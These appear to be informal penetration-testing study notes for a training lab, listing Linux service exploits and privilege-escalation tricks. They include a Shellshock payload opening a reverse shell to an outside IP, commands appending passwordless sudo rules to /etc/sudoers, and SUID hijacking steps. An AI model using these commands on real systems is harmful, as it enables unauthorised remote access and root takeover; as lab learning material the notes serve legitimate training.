##### (linux exploitation)


shellshock
	(this is a vulnerability that can allow an attacker to run its own commands on a website if a website is running cgi its vulnerable then ) (we can find this vuln on webserver when we see something runnig using cgi commands to see if that is vulnerable we can use nmap script http-shellshock with --script-args "http-shellshock.uri=/gettime.cgi when its vulnerable we can go there and use burp and on that we can go to repeater and remove the user agent data and put " () { : ; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/10.17.49.79/7777 0>&1'   and if we want to do that with msf we can search for shellshock and use the apache_mod_cgi_bash exploit and set the targeturi to the path and exploit)



ftp
	(if we have anonymous login thats good if not we can try hydra to do brute force or we can also find some module if there is a ftp vuln)
			this has vsftpd 2.3.4 which is vulnerable to backdoor rce we can use it in msf


ssh
	(for ssh its just usually brute force attack only sometimes we can find any vuln which can be exploited in msf)
			libssh 0.06-0.08 is vuln which we can use in msf libssh auth bypass module 


samba
	(we can do brute force to get the creds and then use the tool smbmap for enum or we can use the smbclient and also we will be using enum4linux)
		if the samba version is vulnerable which is 3.5.x then we can use the samba/is known pipename module to check and attack


smtp
		in smtp which uses haraka can be vuln if their version is 2.8.9 we can use msf haraka smtp module we will use set email_to root@attackdefense.test





##### (linux privesc)

linux kernel vuln
	(if we find a kernel version which can be exploited we can use exploitdb to get that specific kernel vuln and download it in our machine and gcc it and upload it on target machine and exploit it)


crontab
	(we can check whats running on crontab by saying cat /etc/crontab and if we find a file which is running we can check its path by saying grep -rnw /usr -e "/path/to/that/file" and we can then edit that file by nano or by printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers\n' > /usr/local/share/copy.sh || or echo "student ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers)


suid 
	(we can use the string command to find hidden message inside the executable we jsut need to say string filename so if there are random executable files with suid we can do string file and see if its calling another file if it is we can delete that file and make our own file with the same name and we can add bin/bash(to do this we can cp bin/bash filename this will make a new file) in it so we can get root if not we can just check the gtfobins)


ps aux
	when we get a shell we should be checking this because if we see any service running we can see their version by using -V and then check if they are vulnerable for privesc on msf
